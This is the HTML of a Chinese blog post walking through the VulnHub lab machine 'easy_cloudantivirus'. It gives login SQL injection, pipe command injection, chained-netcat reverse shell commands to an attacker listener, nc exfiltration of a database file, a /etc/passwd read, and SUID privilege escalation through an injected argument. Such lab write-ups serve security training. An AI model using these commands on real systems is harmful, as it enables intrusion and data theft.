@@ -1,0 +1,302 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>0x02-VulnHub靶机-easy_cloudantivirus | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="0x02-VulnHub靶机-easy_cloudantivirus | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境
+0x03
+地址:https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453
+靶机用VMware打开扫不到主机
+难度-&gt; 低
+内容
+
+nc串联(管道符号的应用)
+sql注入..." />
+    <meta name="keywords" content="vulnhub,打靶" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              0x02-VulnHub靶机-easy_cloudantivirus
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-02-28
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/SARbZmWC9/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/sYnh9qvSqV/" class="post-tag">
+                  # 打靶
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="环境">环境</h1>
+<p>0x03</p>
+<p>地址:https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453</p>
+<p>靶机用VMware打开扫不到主机</p>
+<p>难度-&gt; 低</p>
+<h3 id="内容">内容</h3>
+<ul>
+<li>nc串联(管道符号的应用)</li>
+<li>sql注入 进后台</li>
+<li>密码爆破 进后台</li>
+<li>ssh爆破登录</li>
+<li>suid提权</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281314129.png" alt="image-20240228131406046" loading="lazy"></figure>
+<h1 id="操作">操作</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>arping 适用范围广</p>
+<p>命令  <code>for i in $(seq 1 254);do sudo arping -c 2 192.168.3.$i;done</code></p>
+<p>然后再扫描端口  发现 22 8080</p>
+<p>是个登录界面</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281025578.png" alt="image-20240228102546550" loading="lazy"></figure>
+<p>dirsearch扫出来/console</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281027903.png" alt="image-20240228102707876" loading="lazy"></figure>
+<h3 id="爆破">爆破</h3>
+<p>先采取对 登录界面爆破    password   回显包长度不同</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281029472.png" alt="image-20240228102943411" loading="lazy"></figure>
+<h3 id="sql注入">sql注入</h3>
+<p>还有当我们输入 &quot;     就会显示报错页面  输入的也有会回显出来 多了个&quot;</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281600769.png" alt="image-20240228160040747" loading="lazy"></figure>
+<p>输入个SELECT version();  说明拼接进去了   构造一下就可以注入了</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281605172.png" alt="image-20240228160508151" loading="lazy"></figure>
+<pre><code>select * from code where password=&quot;  &quot;   &quot;          无法闭合  
+select * from code where password=&quot;  &quot; or 1=1--+  &quot;  
+这里我们是要登入到后台去  输入 &quot;or 1=1--+  将后面内容注释  让这语句恒正确  就可以不用密码 直接进去
+</code></pre>
+<h2 id="渗透">渗透</h2>
+<p>进去之后是一个这样的页面  很像 linux的 ls -all命令所展示出来的结果</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281136592.png" alt="image-20240228113617568" loading="lazy"></figure>
+<p>然后我输入一个文件给他扫描    有回显     可能他的逻辑是   杀毒软件 file    这个时候我们试试 |  接上命令</p>
+<p>看能不能执行</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281136914.png" alt="image-20240228113607880" loading="lazy"></figure>
+<p>cat | id</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281147276.png" alt="image-20240228114758254" loading="lazy"></figure>
+<p>可以的   然后结合是python 环境   写一个python的反弹命令  //</p>
+<p>因为可以执行 linux命令 我们可以用 which nc 看看有没有nc</p>
+<p>这条命令 出不来  因为在有些linux发行版本  nc 不能够用-e</p>
+<pre><code>cat | nc 192.168.3.87 5689 -e /bin/sh
+</code></pre>
+<p>我们试试nc 能不能连接到   cat | nc 192.168.3.87 5689</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281235985.png" alt="image-20240228123514958" loading="lazy"></figure>
+<h3 id="nc串联">nc串联</h3>
+<p>启动两个端口监听</p>
+<p>cat | nc 192.168.3.87 3332 |/bin/bash | nc  192.168.3.87 4443</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281451867.png" alt="image-20240228145153810" loading="lazy"></figure>
+<p>在3332这个端口输入东西会在4443这个端口回显</p>
+<h3 id="用户名密码爆破">用户名密码爆破</h3>
+<p>发现有个database.sql文件,我们需要使用查询分析器运行脚本文件，我们直接执行一下看看，这里启动sqlite，并没有反应，我们使用nc将文件传输到本地中，在本地进行内容的读取</p>
+<p>kali上   			nc -lvvp 2233 &gt;mao.sql</p>
+<p>靶机shell上   	nc -nv 192.168.3.87 2233 &lt;database.sql</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281502614.png" alt="image-20240228150222575" loading="lazy"></figure>
+<p>启动sqlite3       打开导出的sql文件 .open mao.sql   	提取东西 .dump			发现了四个密码</p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281504516.png" alt="image-20240228150428482" loading="lazy"></figure>
+<p>myinvitecode123  	mysecondinvitecode 	cloudavtech 	mostsecurescanner</p>
+<p>结合前面开放的22端口 想到了可以用hydra爆破ssh</p>
+<p>这个时候再到shell上面去查看有哪些用户   cat /etc/passwd</p>
+<p>找有bash的  root cloudav scanner</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281508469.png" alt="image-20240228150834413" loading="lazy"></figure>
+<p>很遗憾  爆破没成功    但是这是一种很重要的思路</p>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281513601.png" alt="image-20240228151356563" loading="lazy"></figure>
+<h2 id="继续收集-提权">继续收集 提权</h2>
+<p>看看能不能suid =&gt;find / -perm -u=s -type f 2&gt;/dev/null</p>
+<p>发现这个 一看就是后面下载的 给的suid权限</p>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281519896.png" alt="image-20240228151953873" loading="lazy"></figure>
+<p>然后切到 这个目录去看看</p>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281542246.png" alt="image-20240228154215224" loading="lazy"></figure>
+<p>update_cloudav  肯定是 update_cloudav.c 编译的     去看看update_cloudav.c代码</p>
+<figure data-type="image" tabindex="18"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281546104.png" alt="image-20240228154600033" loading="lazy"></figure>
+<p>可以看到内容就是执行病毒库的更新程序并且要求我们在执行文件的时候带一个参数（倒数第六行），带的参数也会放到system函数中执行，那我们就尝试让我们的参数是反弹shell的命令即可：</p>
+<p><code>./update_cloudav &quot;a |nc 192.168.3.87 6667 |/bin/bash|nc 192.168.3.87 7778&quot;</code></p>
+<figure data-type="image" tabindex="19"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402281552849.png" alt="image-20240228155255808" loading="lazy"></figure>
+<p>直接拿到root</p>
+<h1 id="总结">总结</h1>
+<h2 id="nc串联-2">nc串联</h2>
+<p>nc -e 参数用不了的时候</p>
+<p>Linux 中，竖线符号 <code>|</code>（管道符号）用于将<strong>一个命令的输出传递给另一个命令作为输入</strong>。这种功能被称为“管道”（pipeline），允许用户将多个命令连接在一起，实现更复杂的操作。</p>
+<p>例如，您可以使用 <code>|</code> 符号来连接两个命令，将第一个命令的输出作为第二个命令的输入</p>
+<p><code>nc 192.168.3.87 3332 |/bin/bash | nc  192.168.3.87 4443</code></p>
+<p>​		第一个 3332端口的连接后续输入所有的指令 都会通过管道发送给bin/bash 去解析   而解析的结果通过另外一个管道发送给第二个4443端口的连接</p>
+<h2 id="sql">sql</h2>
+<p>拿到shell后 sql文件肯定是要看的</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a><br>
+*
+<ul>
+<li><a href="#%E5%86%85%E5%AE%B9">内容</a></li>
+</ul>
+</li>
+<li><a href="#%E6%93%8D%E4%BD%9C">操作</a>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a>
+<ul>
+<li><a href="#%E7%88%86%E7%A0%B4">爆破</a></li>
+<li><a href="#sql%E6%B3%A8%E5%85%A5">sql注入</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B8%97%E9%80%8F">渗透</a>
+<ul>
+<li><a href="#nc%E4%B8%B2%E8%81%94">nc串联</a></li>
+<li><a href="#%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">用户名密码爆破</a></li>
+</ul>
+</li>
+<li><a href="#%E7%BB%A7%E7%BB%AD%E6%94%B6%E9%9B%86-%E6%8F%90%E6%9D%83">继续收集 提权</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a>
+<ul>
+<li><a href="#nc%E4%B8%B2%E8%81%94-2">nc串联</a></li>
+<li><a href="#sql">sql</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/vulnhub-ba-ji-moneybox/">
+              <h3 class="post-title">
+                VulnHub靶机-moneybox
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
